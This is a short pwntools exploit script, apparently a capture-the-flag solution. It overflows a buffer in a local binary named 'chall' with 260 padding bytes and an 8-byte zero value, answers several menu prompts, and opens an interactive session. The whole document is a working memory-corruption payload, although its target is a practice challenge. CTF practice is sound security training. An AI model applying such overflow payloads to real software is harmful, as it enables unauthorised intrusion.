from pwn import *

p = process("./chall")
pad = b"a"*260
val1 = (0).to_bytes(8,byteorder='little')

pay = pad + val1
p.sendlineafter(b'?',pay)

p.sendlineafter(b':',b'2')
p.sendlineafter(b':',b'0')
p.sendlineafter(b':',b'1')
p.interactive()

